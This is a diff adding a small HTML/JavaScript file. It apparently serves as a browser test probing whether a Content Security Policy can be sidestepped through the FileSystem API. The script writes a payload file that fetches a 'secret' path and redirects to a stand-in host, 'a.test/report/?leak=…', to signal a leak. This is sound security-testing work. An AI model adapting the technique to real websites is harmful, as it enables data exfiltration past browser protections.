@@ -1,0 +1,28 @@
+<script>
+  window.requestFileSystem =
+    window.requestFileSystem || window.webkitRequestFileSystem;
+  function onInitFs(fs) {
+    fs.root.getFile(
+      'test.html',
+      { create: true },
+      function (fileEntry) {
+        fileEntry.createWriter(function (fileWriter) {
+          var payload =
+            "<!doctype html><script>var req = new XMLHttpRequest(); req.onreadystatechange = function () { if (this.readyState == 4 && this.status == 200) { document.location.href = 'https://a.test/report/?leak=c1117687'; } }; req.open('GET', '/CSP/c1117687/secret', true); req.send();<\/script>";
+          var blob = new Blob([payload], { type: 'text/html' });
+          fileWriter.write(blob);
+        }, errorHandler);
+
+        var url = fileEntry.toURL();
+        parent.frames[0].location = url;
+      },
+      errorHandler
+    );
+  }
+
+  function errorHandler(e) {
+    console.log(e);
+  }
+
+  window.requestFileSystem(window.TEMPORARY, 1024, onInitFs, errorHandler);
+</script>
